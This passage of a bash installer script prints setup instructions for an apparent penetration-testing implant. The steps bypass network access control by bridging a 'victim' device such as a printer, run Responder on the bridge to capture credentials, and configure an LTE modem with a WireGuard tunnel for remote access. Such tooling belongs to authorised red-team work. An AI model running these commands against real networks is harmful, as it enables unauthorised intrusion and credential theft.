echo -e "${STEP_EMOJI} ${MAGENTA}2. Connect victim (e.g. printer) to eth1 (external USB LAN adapter).${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}3. Change directory to the nac_bypass tool:${RESET}"
echo -e "    ${MAGENTA}    cd ${BOLD}$NAC_BYPASS_DIR${RESET}"
echo -e "${STEP_EMOJI} ${MAGENTA}4. Start the NAC bypass (replace eth0 and eth1 with your actual interface names if different):${RESET}"
echo -e "    ${MAGENTA}    sudo ./nac_bypass_setup.sh -1 eth0 -2 eth1 -S${RESET}"
echo -e "    ${INFO_EMOJI} ${BLUE}The script will prompt you to wait. After it completes, you can proceed with your network scan.${RESET}"
echo -e "    ${INFO_EMOJI} ${BLUE}Remember for Responder, you need to set it up to listen on the bridge interface (br0) and change the answering IP to the victim's IP:${RET}"
echo -e "    ${MAGENTA}    ./Responder.py -I br0 -e victim.ip${RESET}"
echo -e "    ${INFO_EMOJI} ${BLUE}You can inspect iptables rules with: ${BOLD}iptables -t nat -L${RESET}\n"

if [ "$INSTALL_LTE_MODULE" = true ]; then
    echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
    echo -e "${BOLD}${CYAN}Huawei LTE Connect Service Information:${RESET}"
    echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}The 'huawei_hilink_api' repository has been cloned to: ${BOLD}$HUAWEI_HILINK_DIR${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}The 'example_huawei_hilink.sh' script has been updated with your provided credentials and absolute paths.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}A systemd service named '${BOLD}huawei-lte-connect.service${RESET}${BLUE}' has been created to automatically start the LTE connection on boot.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}It will run the script '${BOLD}$HUAWEI_HILINK_DIR/example_huawei_hilink.sh on${RESET}${BLUE}' as user '${BOLD}${LTE_USERNAME}${RESET}${BLUE}'.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}After reboot, the LTE modem should attempt to connect automatically.${RESET}"
    echo -e "${INFO_EMOJI} ${BLUE}You can check the service status with: ${BOLD}sudo systemctl status huawei-lte-connect.service${RESET}"

    if [ "$INSTALL_WIREGUARD" = true ]; then
        echo -e "${INFO_EMOJI} ${BLUE}The WireGuard VPN (${BOLD}wg0${RESET}${BLUE}) has been configured to start automatically AFTER the LTE connection has stable internet access via ${BOLD}eth2${RESET}${BLUE}.${RESET}"
        echo -e "${INFO_EMOJI} ${BLUE}You must place your WireGuard configuration file as ${BOLD}/etc/wireguard/wg0.conf${RESET}${BLUE} for it to work.${RESET}"
        echo -e "${INFO_EMOJI} ${BLUE}You can check the WireGuard service status with: ${BOLD}sudo systemctl status wg-quick@wg0.service${RESET}"
        echo -e "${INFO_EMOJI} ${BLUE}And the WireGuard tunnel status with: ${BOLD}sudo wg${RESET}\n"
    fi
    echo -e "${BOLD}${CYAN}----------------------------------------------------------------${RESET}"
fi
